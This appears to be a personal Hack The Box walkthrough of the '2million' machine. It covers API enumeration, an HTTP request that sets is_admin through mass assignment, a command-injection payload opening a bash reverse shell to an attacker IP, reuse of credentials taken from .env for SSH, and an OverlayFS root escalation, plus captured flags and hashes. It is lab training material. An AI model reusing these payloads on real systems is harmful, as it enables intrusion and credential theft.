---
os: linux
status: 
tags:
  - API
  - OS_Version
  - Library_Version
aliases:
---
## Improved skills

- API hacking, I needed to give more enumeration for APIs.
- Old OS Version, And Old glibc library that both can lead to privilege escelation

## Used tools

- nmap
- gobuster


---

# Information Gathering

Scanned common TCP ports:

```sh
sudo nmap -sV -sC -vvv 10.10.11.221 -oA nmap/initialNmap.txt 
PORT   STATE SERVICE REASON         VERSION                                                                                                                                                        
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)                                                                                                   
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

# Enumeration

## Port 80 - HTTP (Apache)

[[Z Assets/Images/Pasted image 20250815211208.jpeg|Open: Pasted image 20250815211208.png]]
![[Z Assets/Images/Pasted image 20250815211208.jpeg]]

```js
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

### Requesting the API
[[Z Assets/Images/Pasted image 20250815211837.jpeg|Open: Pasted image 20250815211837.png]]
![[Z Assets/Images/Pasted image 20250815211837.jpeg]]

It uses Ceser cipher and with small brute forcing we got

```
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generateZntvp
```

When accessing this api, Always get `400` response.

[[Z Assets/Images/Pasted image 20250815214203.jpeg|Open: Pasted image 20250815214203.png]]
![[Z Assets/Images/Pasted image 20250815214203.jpeg]]

Back to previous walkthrough of application, specifily to `/api/v1/verify` endpoint. When we try to access it we find this intresting response.

[[Z Assets/Images/Pasted image 20250815214346.jpeg|Open: Pasted image 20250815214346.png]]
![[Z Assets/Images/Pasted image 20250815214346.jpeg]]

The `code` parameter is missing, then lets give it this parameter.

[[Z Assets/Images/Pasted image 20250815214938.jpeg|Open: Pasted image 20250815214938.png]]
![[Z Assets/Images/Pasted image 20250815214938.jpeg]]

Nothing works, I do think there is some of validation happening and it give me unabled me to access the resource.


I found the problem was in me while decryption

[[Z Assets/Images/Pasted image 20250815215716.jpeg|Open: Pasted image 20250815215716.png]]
![[Z Assets/Images/Pasted image 20250815215716.jpeg]]

Now that successeded

[[Z Assets/Images/Pasted image 20250815215758.jpeg|Open: Pasted image 20250815215758.png]]
![[Z Assets/Images/Pasted image 20250815215758.jpeg]]

This code is encoded with base64.

Then we register an account using the invite code, Then we are in!

Some of interesting Things founded in the website.
[[Z Assets/Images/Pasted image 20250815220614.jpeg|Open: Pasted image 20250815220614.png]]
![[Z Assets/Images/Pasted image 20250815220614.jpeg]]

Fogetten about api, We should have made more investigation on it.

[[Z Assets/Images/Pasted image 20250815233412.jpeg|Open: Pasted image 20250815233412.png]]
![[Z Assets/Images/Pasted image 20250815233412.jpeg]]

[[Z Assets/Images/Pasted image 20250815233910.jpeg|Open: Pasted image 20250815233910.png]]
![[Z Assets/Images/Pasted image 20250815233910.jpeg]]


```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Content-Length: 62
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Accept-Language: en-US
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=l7s50b4f6e8k95seqin2f9s0ld

{
"user": "slom",
"email":"slom@gmail.com",
"is_admin":1
}
```

Easy reverse shell in `/api/v1/admin/vpn/generate`

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=125qob11f5r6kke3j1qlbf8rll
Connection: keep-alive
Content-type: application/json
Content-Length: 84

{
  "username": "slom;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.94/4444 0>&1';"
}
```


---

# Lateral Movement to xxx

## Local enumeration


## Lateral movement vector

---

# Privilege Escalation to xxx

## Intial look

We have droppped to box with `www-data` user, by looking at the files we may be able to read database files. And use one of the passwords.
```sh
www-data@2million:~/html$ ls
Database.php  Router.php  VPN  assets  controllers  css  fonts  images  index.php  js  views
```

### index.php

looking at the content of index.php, we find that the website is reading the configurations from `.env` file.
[[Z Assets/Images/Pasted image 20250816120341.jpeg|Open: Pasted image 20250816120341.png]]
![[Z Assets/Images/Pasted image 20250816120341.jpeg]]

[[Z Assets/Images/Pasted image 20250816120509.jpeg|Open: Pasted image 20250816120509.png]]
![[Z Assets/Images/Pasted image 20250816120509.jpeg]]

The content is quite interesting
[[Z Assets/Images/Pasted image 20250816120545.jpeg|Open: Pasted image 20250816120545.png]]
![[Z Assets/Images/Pasted image 20250816120545.jpeg]]
```sh
www-data@2million:~/html$ cat .env 
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

### Connecting to database
```sh
mysql -u admin -p htb_prod


MariaDB [htb_prod]> select * from users;
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| id | username     | email                      | password                                                     | is_admin |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
| 13 | slom         | slom@gmail.com             | $2y$10$8JgUdlLzI3eJLbf4U9fvIu/9I20L.g/v3wtfu1du5OHTNl2AWAxXO |        1 |
| 14 | kaan         | kaan40111@gmail.com        | $2y$10$tEJ8Z0dHZMu0EPSwBO5qAOTpS74j.3A4qrTSkBumQj/UHI0mP9t.. |        0 |
| 15 | asd          | asdasd@wdwa.co             | $2y$10$ALod1SF0I8Bxk.cwlzc6N.bBcRUNxiqFtj5Zgm1SxvybQ4.YVKa82 |        0 |
| 16 | asdasd       | asd@asd.asd                | $2y$10$oBZpxx22KwCiVtS3FsNulef0yXqdR.uUwLT6fTOpF34O0ke7YEdqe |        0 |
| 17 | testdummy    | w@gmail.com                | $2y$10$KYv53IW.He6rl/OvGqObQOoFaPHDlOP3hS/d8q2xy.dVUpDcjXFau |        0 |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+

MariaDB [htb_prod]> select * from invite_codes;
+----+-------------------------+
| id | code                    |
+----+-------------------------+
|  2 | SP1F1-XQODG-4W8RX-DHW9K |
|  4 | VG6FO-HLX9B-1CB6W-C2LLP |
|  6 | B3IRI-MCHR7-3EPV0-7P4B1 |
|  7 | JE9D7-J5PPL-LJ82R-IWH4S |
|  8 | 0KFVA-P26W7-UWT9N-XFW75 |
| 11 | V0VMS-SMM9A-7ODN7-K1L42 |
| 13 | QG7VM-ARQRG-9HE4D-UJJ45 |
+----+-------------------------+
7 rows in set (0.001 sec)

MariaDB [htb_prod]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb_prod           |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

```

### Using the same credentials for ssh

```
ssh admin@10.10.11.221  
SuperDuperPass123
```

### Credentials
```sh
admin@2million:~$ cat user.txt 
2a0744336fa6d48b841a6800811cdb7d
```
## Local enumeration

### Local open ports
```sh
netstat -lntp 
tcp        0      0 127.0.0.1:11211         memcached syn-ack ttl 64 Memcached 1.6.14 (uptime 68369 seconds)
                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -  
```

```sh
/etc/cron.daily:
total 32
drwxr-xr-x   2 root root 4096 Jun  6  2023 .
drwxr-xr-x 101 root root 4096 Jun  6  2023 ..
-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  8  2022 apt-compat
-rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg
-rwxr-xr-x   1 root root  377 May 25  2022 logrotate

You can write SUID file: /tmp/ovlcap/upper/file 
```

## Privilege Escalation vector


```
root@2million:/tmp/ovlcap/upper# sudo file
Usage: file [-bcCdEhikLlNnprsSvzZ0] [--apple] [--extension] [--mime-encoding]
            [--mime-type] [-e <testname>] [-F <separator>]  [-f <namefile>]
            [-m <magicfiles>] [-P <parameter=value>] [--exclude-quiet]
            <file> ...
       file -C [-m <magicfiles>]
       file [--help]
root@2million:/tmp/ovlcap/upper# sudo ./file
root@2million:/tmp/ovlcap/upper# cat /root/root.txt 
a9dc068d8687b6da982b08a61c95ef21
33087587a5ba2a55eb91567ee828e74a
```

```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
```

---

# Trophy

{{image}}

>[!todo] **User.txt**
>flag

>[!todo] **Root.txt**
>flag

**/etc/shadow**

```sh

```


tp-link
```
Nmap scan report for 192.168.18.29
Host is up (0.077s latency).

PORT   STATE    SERVICE
80/tcp filtered http
MAC Address: DA:0D:17:DB:E3:78 (Unknown)



```